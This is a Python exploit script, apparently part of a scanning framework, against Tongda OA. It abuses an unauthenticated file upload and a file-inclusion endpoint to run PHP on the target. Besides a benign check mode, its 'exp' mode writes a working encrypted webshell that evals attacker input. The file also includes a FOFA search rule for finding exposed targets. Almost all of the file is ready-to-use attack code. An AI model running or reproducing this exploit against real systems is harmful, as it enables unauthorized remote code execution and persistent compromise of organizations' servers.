#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import json
import requests
import requests.packages.urllib3
import re
import io
from Config.config_requests import ua
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


# 脚本信息
######################################################
NAME='TDXK_Any file upload'
AUTHOR="境心"
REMARK='TDXK_前台任意文件上传'
FOFA_RULE='app="TDXK-通达OA"'
######################################################

def poc_content():
    content = """------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="UPLOAD_MODE"

1
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="P"

1
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="DEST_UID"

1
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="ATTACHMENT"; filename="jpg"
Content-Type: image/jpeg

<?php
echo "this is a friendly test, Please check and repair upload vulnerabilities."
?>
------WebKitFormBoundarypyfBh1YB4pV8McGB--"""
    mem_string = io.StringIO()
    mem_string.write(content)
    mem_string.seek(0)
    return mem_string

def exp_content():
    content = """------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="UPLOAD_MODE"

1
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="P"

1
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="DEST_UID"

1
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="ATTACHMENT"; filename="jpg"
Content-Type: image/jpeg

<?php
$myfile = fopen("../../general/eninde.php", "w");
$txt = '<?php
@error_reporting(0);
session_start();
    $key="e45e329feb5d925b";
	$_SESSION["k"]=$key;
	session_write_close();
	$post=file_get_contents("php://input");
	if(!extension_loaded("openssl"))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode("|",$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>';
fwrite($myfile, $txt);
fclose($myfile);
?>
------WebKitFormBoundarypyfBh1YB4pV8McGB--"""
    mem_string = io.StringIO()
    mem_string.write(content)
    mem_string.seek(0)
    return mem_string

def verify_poc(target,exp=None):
    upload_url = target+"/ispirit/im/upload.php"
    headers = {
        "User-Agent": ua,
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5",
        "Cookie": "PHPSESSID=000",
        "Connection": "close"
    }
    if exp == None:
        mem_string = poc_content()
        target_tmp_file = [('ATTACHMENT', ('upload_poc.jpg', mem_string.read(), 'image/jpeg'))]
    elif exp == "exp":
        mem_string = exp_content()
        target_tmp_file = [('ATTACHMENT', ('upload_exp.jpg', mem_string.read(), 'image/jpeg'))]
    try:
        res = requests.post(upload_url, headers=headers, files=target_tmp_file, verify=False, timeout=5)
    except:
        pass
    res_content = res.text
    if "用户未登陆" in res_content:
        return None
    elif "\\u4e0a\\u4f20\\u5931\\u8d25" in res_content:
        return None
    else:
        target_tmp_path = re.findall('@(\d+)_', str(res_content))[0]
        target_filename = re.findall('_(\d+)\|', str(res_content))[0]
        target_path = "/general/../../attach/im/"+str(target_tmp_path)+"/"+str(target_filename)+".jpg"
        return target_path

def poc(target,exp=None):
    target_path = verify_poc(target,exp)
    if target_path:
        result = {}
        include_url1 = target + "/ispirit/interface/gateway.php"
        include_url2 = target + "/mac/gateway.php"
        # 格式化POST表单
        include_json_data = {"url":target_path}
        include_data = json.dumps(include_json_data)
        include_form_data = {"json":include_data}
        # 请求poc验证
        target_res = requests.post(include_url1, data=include_form_data, verify=False, timeout=5)
        result['vul_url'] = include_url1
        if target_res.status_code == 404:
            target_res = requests.post(include_url2, data=include_form_data, verify=False, timeout=5)
            result['vul_url'] = include_url2
        if exp == None:
            if "this is a friendly test" in str(target_res.text):
                include_json_data = json.dumps(include_json_data)
                target_post_data = "json=" + include_json_data
                result['vul_post_data'] = target_post_data
                result['message'] = "存在任意文件上传漏洞"
                result['poc'] = NAME
                return result
            else:
                pass
        elif exp == "exp":
            exp_url = target+"general/eninde.php"
            exp_res = requests.get(exp_url, verify=False, timeout=5)
            if exp_res.status_code == 200:
                print("webshell地址为: "+target+"general/index.php")
            elif exp_res.status_code == 404:
                print("webshell生成失败")
            else:
                print("已上传成功，但连接时可能被waf拦截")

if __name__ == '__main__':
    # poc调用
    poc("http://127.0.0.1/")
    # exp单独调用方式。 exp调用请传参时附带第二个参数内容，参数内容为exp
    # poc("http://127.0.0.1/", "exp")